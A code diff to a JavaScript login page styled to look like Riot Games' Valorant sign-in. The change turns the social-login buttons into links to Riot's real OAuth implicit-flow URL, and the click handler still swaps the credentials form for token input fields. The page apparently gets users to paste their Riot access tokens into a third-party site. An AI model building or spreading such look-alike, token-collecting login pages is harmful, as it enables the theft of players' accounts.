@@ -45,21 +45,21 @@ export function render() {
 
           <!-- Social Buttons Row exactly like original -->
           <div class="social-login-row">
-            <button type="button" class="social-btn facebook-btn" id="social-fb" title="Facebook">
+            <a href="https://auth.riotgames.com/authorize?client_id=play-valorant-web-prod&nonce=1&redirect_uri=https://playvalorant.com/opt_in&response_type=token%20id_token&scope=openid%20link%20ban%20lol_region" target="_blank" class="social-btn facebook-btn" id="social-fb" title="Facebook">
               <svg viewBox="0 0 24 24" fill="currentColor" class="social-icon"><path d="M9 8h-3v4h3v12h5v-12h3.642l.358-4h-4v-1.667c0-.955.192-1.333 1.115-1.333h2.885v-5h-3.808c-3.596 0-5.192 1.583-5.192 4.615v3.385z"/></svg>
-            </button>
-            <button type="button" class="social-btn google-btn" id="social-google" title="Google">
+            </a>
+            <a href="https://auth.riotgames.com/authorize?client_id=play-valorant-web-prod&nonce=1&redirect_uri=https://playvalorant.com/opt_in&response_type=token%20id_token&scope=openid%20link%20ban%20lol_region" target="_blank" class="social-btn google-btn" id="social-google" title="Google">
               <svg viewBox="0 0 24 24" fill="currentColor" class="social-icon"><path d="M12.24 10.285V14.4h6.887c-.648 2.41-2.519 4.114-5.136 4.114-3.535 0-6.403-2.868-6.403-6.403s2.868-6.403 6.403-6.403c1.582 0 3.024.574 4.14 1.522l3.075-3.075C19.167 2.227 15.93 1 12.24 1 5.48 1 0 6.48 0 13.24s5.48 12.24 12.24 12.24c6.76 0 12.24-5.48 12.24-12.24 0-.79-.08-1.57-.24-2.32H12.24z"/></svg>
-            </button>
-            <button type="button" class="social-btn apple-btn" id="social-apple" title="Apple">
+            </a>
+            <a href="https://auth.riotgames.com/authorize?client_id=play-valorant-web-prod&nonce=1&redirect_uri=https://playvalorant.com/opt_in&response_type=token%20id_token&scope=openid%20link%20ban%20lol_region" target="_blank" class="social-btn apple-btn" id="social-apple" title="Apple">
               <svg viewBox="0 0 24 24" fill="currentColor" class="social-icon"><path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M15.97 4.17c.66-.81 1.11-1.93.99-3.06-1 .04-2.22.67-2.94 1.51-.64.73-1.2 1.87-1.05 2.98 1.12.09 2.26-.57 3-.143z"/></svg>
-            </button>
-            <button type="button" class="social-btn xbox-btn" id="social-xbox" title="Xbox">
+            </a>
+            <a href="https://auth.riotgames.com/authorize?client_id=play-valorant-web-prod&nonce=1&redirect_uri=https://playvalorant.com/opt_in&response_type=token%20id_token&scope=openid%20link%20ban%20lol_region" target="_blank" class="social-btn xbox-btn" id="social-xbox" title="Xbox">
               <svg viewBox="0 0 24 24" fill="currentColor" class="social-icon"><path d="M11.62 0C5.176 0 0 5.177 0 11.622c0 6.446 5.176 11.622 11.62 11.622 6.445 0 11.62-5.176 11.62-11.622C23.24 5.177 18.065 0 11.62 0zm-1.842 4.135c1.474-.897 3.398-.923 4.904-.064 1.346.77 2.051 2.372 1.63 3.73-.205.68-.692 1.295-1.128 1.834-.693.858-1.564 1.589-2.502 2.193-.974-.693-1.91-1.462-2.617-2.399-.449-.602-.91-1.256-1.012-1.986-.18-.73-.013-1.577.41-2.203.22-.32.55-.654.915-1.105zm3.834 14.654c-1.397.666-3.115.538-4.385-.295-.615-.423-1.09-.948-1.487-1.538-1.064-1.564-1.526-3.487-1.744-5.359.743.68 1.55 1.308 2.45 1.82 1.55.885 3.32 1.385 5.166 1.385 1.846 0 3.615-.5 5.166-1.384.9-.513 1.707-1.14 2.45-1.821-.218 1.872-.68 3.795-1.744 5.36-.397.59-.872 1.115-1.487 1.538-1.27.833-2.988.96-4.385.295z"/></svg>
-            </button>
-            <button type="button" class="social-btn psn-btn" id="social-psn" title="PlayStation">
+            </a>
+            <a href="https://auth.riotgames.com/authorize?client_id=play-valorant-web-prod&nonce=1&redirect_uri=https://playvalorant.com/opt_in&response_type=token%20id_token&scope=openid%20link%20ban%20lol_region" target="_blank" class="social-btn psn-btn" id="social-psn" title="PlayStation">
               <svg viewBox="0 0 24 24" fill="currentColor" class="social-icon"><path d="M23.669 16.745c-.477-.736-1.535-1.343-3.14-1.815-1.606-.473-3.693-.787-6.26-.938V12.75c3.04.148 5.766.495 8.169 1.04 1.36.31 2.378.719 3.056 1.23.678.51 1.018 1.157 1.018 1.94 0 .907-.468 1.636-1.402 2.186-.933.551-2.274.965-4.02 1.242-1.747.277-3.835.438-6.262.482v-2.09c1.947-.073 3.649-.221 5.105-.445 1.455-.223 2.502-.516 3.14-.88.636-.363.955-.785.955-1.264s-.32-.897-.959-1.246zm-12.782.9c0 .484.341.91.1.22-.387-.698-1.528-1.306-3.424-1.823-1.895-.518-4.484-.863-7.766-1.037V11.75c3.708.148 6.953.513 9.734 1.096 1.61.336 2.825.776 3.645 1.32.82.544 1.23 1.233 1.23 2.068 0 .97-.565 1.748-1.696 2.336-1.13.587-2.753 1.028-4.869 1.322-2.115.294-4.636.467-7.564.516v-2.247c2.355-.078 4.41-.237 6.17-.478 1.76-.24 3.024-.555 3.792-.947.77-.39 1.148-.844 1.148-1.362z"/></svg>
-            </button>
+            </a>
           </div>
           
           <div class="form-checkbox-row">
@@ -188,13 +188,8 @@ export function init() {
   // Handle Social Clicks (Google, Apple, Xbox, etc.) - Opens Official Login portal
   const socialBtns = document.querySelectorAll('.social-btn');
   socialBtns.forEach(btn => {
-    btn.addEventListener('click', () => {
+    btn.addEventListener('click', (e) => {
       showToast(`Opening official Riot Sign-In for ${btn.title}...`, 'info');
-      
-      const authUrl = 'https://auth.riotgames.com/authorize?client_id=play-valorant-web-prod&nonce=1&redirect_uri=https://playvalorant.com/opt_in&response_type=token%20id_token&scope=openid%20link%20ban%20lol_region';
-      
-      // Open in new window
-      window.open(authUrl, '_blank');
       
       // Hide standard forms and show the token input fields
       credentialsForm.style.display = 'none';
